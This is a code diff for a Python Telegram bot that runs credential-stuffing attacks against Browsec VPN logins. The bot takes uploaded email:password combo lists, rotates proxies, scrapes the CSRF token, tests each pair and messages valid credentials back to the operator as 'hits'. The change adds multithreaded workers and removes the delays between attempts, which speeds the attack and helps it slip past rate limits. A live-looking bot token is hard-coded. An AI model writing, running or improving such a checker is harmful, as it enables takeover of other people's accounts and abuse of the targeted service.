@@ -3,6 +3,7 @@ import requests
 from bs4 import BeautifulSoup
 import time
 import itertools
+import threading
 
 TOKEN = '8072279299:AAH5u2FLs5jVEP_MjJ8uoAGI9bp0_cmabg8'
 bot = telebot.TeleBot(TOKEN)
@@ -13,11 +14,16 @@ LOGIN_URL = 'https://browsec.com/en/login'
 user_states = {}
 # Structure example:
 # user_states[user_id] = {
-#   'status': 'waiting_combo' / 'waiting_proxy_type' / 'waiting_proxy_file' / 'checking' / 'stopped',
+#   'status': 'waiting_combo' / 'waiting_proxy_type' / 'waiting_proxy_file' / 'waiting_bot_count' / 'checking' / 'stopped',
 #   'combo_lines': [...],
 #   'proxy_type': None,
 #   'proxy_lines': [...],
 #   'proxy_cycle': iterator,
+#   'bot_count': int,
+#   'threads': [],
+#   'stop_flag': False,
+#   counters: checked, hits, failures, retries,
+#   checking_msg_id, checking_chat_id
 # }
 
 def reset_user_state(user_id):
@@ -27,13 +33,15 @@ def reset_user_state(user_id):
         'proxy_type': None,
         'proxy_lines': [],
         'proxy_cycle': None,
-        'checking_msg_id': None,
-        'checking_chat_id': None,
+        'bot_count': 1,
+        'threads': [],
+        'stop_flag': False,
         'checked': 0,
         'hits': 0,
         'failures': 0,
         'retries': 0,
-        'stop_flag': False,
+        'checking_msg_id': None,
+        'checking_chat_id': None,
     }
 
 @bot.message_handler(commands=['start'])
@@ -76,8 +84,9 @@ def handle_file(message):
                      "Add Proxy file.\n"
                      "/http if you want to send http proxy type\n"
                      "/socks4 if you want to send socks4 proxy type\n"
-                     "/socks5 if you want to send socks5 proxy type\n\n"
-                     "Send one of these commands to choose proxy type or send /noproxy to skip proxy and start checking without proxy.")
+                     "/socks5 if you want to send socks5 proxy type\n"
+                     "/noproxy if you want to skip proxy\n\n"
+                     "Send one of these commands to choose proxy type.")
     elif state['status'] == 'waiting_proxy_file':
         # Receive proxy file
         file_info = bot.get_file(message.document.file_id)
@@ -88,14 +97,9 @@ def handle_file(message):
             bot.reply_to(message, "The proxy file is empty or invalid. Please send a valid proxy list or /noproxy to skip.")
             return
         state['proxy_lines'] = lines
-        # Create infinite cycle iterator for proxies
         state['proxy_cycle'] = itertools.cycle(state['proxy_lines'])
-        state['status'] = 'checking'
-        bot.reply_to(message, "Starting checking with proxies...")
-        bot.send_message(message.chat.id, "You can send /stop anytime to stop checking.")
-        # Start checking in a new thread or async task to avoid blocking
-        import threading
-        threading.Thread(target=check_accounts, args=(message.chat.id, user_id), daemon=True).start()
+        state['status'] = 'waiting_bot_count'
+        bot.reply_to(message, "How many bots (threads) do you want to use? Send me a number (e.g. 5).")
     else:
         bot.reply_to(message, "I am not expecting a file now. Please follow instructions or send /stop and /start.")
 
@@ -113,15 +117,11 @@ def handle_proxy_type(message):
 
     cmd = message.text.lower()
     if cmd == '/noproxy':
-        # No proxy, start checking directly
         state['proxy_type'] = None
         state['proxy_lines'] = []
         state['proxy_cycle'] = None
-        state['status'] = 'checking'
-        bot.reply_to(message, "Starting checking without proxy...")
-        bot.send_message(message.chat.id, "You can send /stop anytime to stop checking.")
-        import threading
-        threading.Thread(target=check_accounts, args=(message.chat.id, user_id), daemon=True).start()
+        state['status'] = 'waiting_bot_count'
+        bot.reply_to(message, "How many bots (threads) do you want to use? Send me a number (e.g. 5).")
         return
 
     proxy_type_map = {
@@ -138,109 +138,22 @@ def handle_proxy_type(message):
     state['status'] = 'waiting_proxy_file'
     bot.reply_to(message, f"Send me your .txt proxy file for {state['proxy_type']} proxies, one proxy per line.")
 
-def check_accounts(chat_id, user_id):
-    state = user_states.get(user_id)
-    if not state:
+@bot.message_handler(func=lambda m: m.text and m.text.isdigit())
+def handle_bot_count(message):
+    user_id = message.from_user.id
+    if user_id not in user_states:
         return
-
-    combo_lines = state['combo_lines']
-    total = len(combo_lines)
-    checked = 0
-    hits = 0
-    failures = 0
-    retries = 0
-
-    # Send initial progress message
-    progress_msg = bot.send_message(chat_id,
-                                   f"Checked = {checked}/{total}\nHits = {hits}\nFailure = {failures}\nRetry = {retries}")
-    state['checking_msg_id'] = progress_msg.message_id
-    state['checking_chat_id'] = chat_id
-
-    session = requests.Session()
-
-    for line in combo_lines:
-        if user_states[user_id]['stop_flag']:
-            bot.send_message(chat_id, "Checking stopped by user.")
-            state['status'] = 'stopped'
-            return
-
-        email, password = line.split(':', 1)
-        email = email.strip()
-        password = password.strip()
-
-        while True:
-            if user_states[user_id]['stop_flag']:
-                bot.send_message(chat_id, "Checking stopped by user.")
-                state['status'] = 'stopped'
-                return
-
-            # Get authenticity_token
-            try:
-                resp = session.get(LOGIN_URL, timeout=15)
-                soup = BeautifulSoup(resp.text, 'html.parser')
-                token_input = soup.find("input", {"name": "authenticity_token"})
-                if not token_input:
-                    bot.edit_message_text("Failed to get authenticity_token from login page.",
-                                          chat_id, state['checking_msg_id'])
-                    state['status'] = 'stopped'
-                    return
-                token = token_input.get("value")
-            except Exception:
-                retries += 1
-                update_progress(user_id)
-                time.sleep(7)
-                continue
-
-            payload = {
-                "authenticity_token": token,
-                "email": email,
-                "user[password]": password
-            }
-            headers = {
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Referer": LOGIN_URL,
-                "User-Agent": "Mozilla/5.0"
-            }
-
-            proxies = None
-            if state['proxy_type'] and state['proxy_cycle']:
-                proxy = next(state['proxy_cycle'])
-                proxy_url = f"{state['proxy_type']}://{proxy}"
-                proxies = {
-                    'http': proxy_url,
-                    'https': proxy_url,
-                }
-
-            try:
-                post_resp = session.post(LOGIN_URL, data=payload, headers=headers, timeout=15, proxies=proxies)
-                text = post_resp.text
-            except Exception:
-                retries += 1
-                update_progress(user_id)
-                time.sleep(7)
-                continue
-
-            if "Sign out" in text:
-                hits += 1
-                checked += 1
-                bot.send_message(chat_id,
-                                 f"browsec Hits\n\n{email}:{password}")
-                update_progress(user_id)
-                break
-            elif ("Incorrect password/email" in text) or ("Param is missing or the value is empty" in text):
-                failures += 1
-                checked += 1
-                update_progress(user_id)
-                break
-            else:
-                retries += 1
-                update_progress(user_id)
-                time.sleep(7)
-
-        time.sleep(7)
-
-    bot.send_message(chat_id, "Checking completed.")
-    state['status'] = 'stopped'
+    state = user_states[user_id]
+    if state['status'] != 'waiting_bot_count':
+        return
+    bot_count = int(message.text)
+    if bot_count < 1:
+        bot.reply_to(message, "Please send a valid number greater than 0.")
+        return
+    state['bot_count'] = bot_count
+    state['status'] = 'checking'
+    bot.reply_to(message, f"Starting checking with {bot_count} bot(s)... You can send /stop anytime to stop checking.")
+    threading.Thread(target=check_accounts_multithreaded, args=(message.chat.id, user_id), daemon=True).start()
 
 def update_progress(user_id):
     state = user_states.get(user_id)
@@ -256,74 +169,34 @@ def update_progress(user_id):
             state['checking_msg_id']
         )
     except Exception:
-        # Message might be deleted or edited too fast - ignore
         pass
 
-# Override counters update inside check_accounts to update state counters
-def update_counters(user_id, checked=None, hits=None, failures=None, retries=None):
+def worker_thread(user_id, combos_slice):
     state = user_states.get(user_id)
     if not state:
         return
-    if checked is not None:
-        state['checked'] = checked
-    if hits is not None:
-        state['hits'] = hits
-    if failures is not None:
-        state['failures'] = failures
-    if retries is not None:
-        state['retries'] = retries
-
-# Patch check_accounts to update counters in state before updating progress
-def patched_check_accounts(chat_id, user_id):
-    state = user_states.get(user_id)
-    if not state:
-        return
-
-    combo_lines = state['combo_lines']
-    total = len(combo_lines)
-    checked = 0
-    hits = 0
-    failures = 0
-    retries = 0
-
-    progress_msg = bot.send_message(chat_id,
-                                   f"Checked = {checked}/{total}\nHits = {hits}\nFailure = {failures}\nRetry = {retries}")
-    state['checking_msg_id'] = progress_msg.message_id
-    state['checking_chat_id'] = chat_id
-
     session = requests.Session()
-
-    for line in combo_lines:
-        if user_states[user_id]['stop_flag']:
-            bot.send_message(chat_id, "Checking stopped by user.")
-            state['status'] = 'stopped'
+    for line in combos_slice:
+        if state['stop_flag']:
             return
-
         email, password = line.split(':', 1)
         email = email.strip()
         password = password.strip()
-
         while True:
-            if user_states[user_id]['stop_flag']:
-                bot.send_message(chat_id, "Checking stopped by user.")
-                state['status'] = 'stopped'
+            if state['stop_flag']:
                 return
-
             try:
                 resp = session.get(LOGIN_URL, timeout=15)
                 soup = BeautifulSoup(resp.text, 'html.parser')
                 token_input = soup.find("input", {"name": "authenticity_token"})
                 if not token_input:
-                    bot.edit_message_text("Failed to get authenticity_token from login page.",
-                                          chat_id, state['checking_msg_id'])
+                    bot.send_message(state['checking_chat_id'], "Failed to get authenticity_token from login page. Stopping.")
                     state['status'] = 'stopped'
                     return
                 token = token_input.get("value")
             except Exception:
-                retries += 1
-                update_counters(user_id, retries=retries)
+                state['retries'] += 1
                 update_progress(user_id)
-                time.sleep(7)
                 continue
 
             payload = {
@@ -350,38 +223,65 @@ def patched_check_accounts(chat_id, user_id):
                 post_resp = session.post(LOGIN_URL, data=payload, headers=headers, timeout=15, proxies=proxies)
                 text = post_resp.text
             except Exception:
-                retries += 1
-                update_counters(user_id, retries=retries)
+                state['retries'] += 1
                 update_progress(user_id)
-                time.sleep(7)
                 continue
 
             if "Sign out" in text:
-                hits += 1
-                checked += 1
-                update_counters(user_id, checked=checked, hits=hits)
-                bot.send_message(chat_id,
+                state['hits'] += 1
+                state['checked'] += 1
+                bot.send_message(state['checking_chat_id'],
                                  f"browsec Hits\n\n{email}:{password}")
                 update_progress(user_id)
                 break
             elif ("Incorrect password/email" in text) or ("Param is missing or the value is empty" in text):
-                failures += 1
-                checked += 1
-                update_counters(user_id, checked=checked, failures=failures)
+                state['failures'] += 1
+                state['checked'] += 1
                 update_progress(user_id)
                 break
             else:
-                retries += 1
-                update_counters(user_id, retries=retries)
+                state['retries'] += 1
                 update_progress(user_id)
-                time.sleep(7)
+                continue
 
-        time.sleep(7)
+def check_accounts_multithreaded(chat_id, user_id):
+    state = user_states.get(user_id)
+    if not state:
+        return
+    combos = state['combo_lines']
+    total = len(combos)
+    state['checked'] = 0
+    state['hits'] = 0
+    state['failures'] = 0
+    state['retries'] = 0
+    state['checking_msg_id'] = None
+    state['checking_chat_id'] = chat_id
 
-    bot.send_message(chat_id, "Checking completed.")
+    progress_msg = bot.send_message(chat_id,
+                                   f"Checked = 0/{total}\nHits = 0\nFailure = 0\nRetry = 0")
+    state['checking_msg_id'] = progress_msg.message_id
+
+    bot_count = state['bot_count']
+    # Split combos into roughly equal chunks for each thread
+    chunks = [combos[i::bot_count] for i in range(bot_count)]
+
+    threads = []
+    for chunk in chunks:
+        t = threading.Thread(target=worker_thread, args=(user_id, chunk))
+        t.start()
+        threads.append(t)
+    state['threads'] = threads
+
+    # Wait for all threads to finish
+    for t in threads:
+        t.join()
+
+    if not state['stop_flag']:
+        bot.send_message(chat_id, "Checking completed.")
+    else:
+        bot.send_message(chat_id, "Checking stopped by user.")
+
     state['status'] = 'stopped'
-
-# Use the patched version with counters updates
-check_accounts = patched_check_accounts
+    state['stop_flag'] = False
 
 bot.infinity_polling()
